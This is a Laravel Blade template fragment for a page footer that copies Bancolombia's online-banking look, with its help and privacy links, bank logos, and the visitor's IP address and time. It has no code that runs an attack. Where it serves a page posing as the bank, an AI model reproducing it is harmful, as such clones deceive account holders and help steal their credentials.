<div class="footer">
    <ul>
        <li>¿Problemas para conectarte?</li>
        <li>Aprende sobre seguridad</li>
        <li>Reglamento sucursal virtual</li>
        <li>Política de privacidad</li>
    </ul>

    <hr>

    <div class="footer-end">
        <div>
            <div class="footer-logo">
                <img src="{{ asset('assets/img/payment/bancolombia/logo.svg') }}" alt="Bancolombia">
            </div>
            <div class="footer-logo-vigilado">
                <img src="{{ asset('assets/img/payment/bancolombia/logo-vigilado.png') }}" alt="Vigilado">
            </div>
        </div>

        <div class="device-info">
            @if(!empty($ip))
                <span>Dirección IP: {{ $ip }}</span><br>
            @endif

            @if(!empty($datetimeText))
                <span>{{ $datetimeText }}</span>
            @endif
        </div>
    </div>
</div>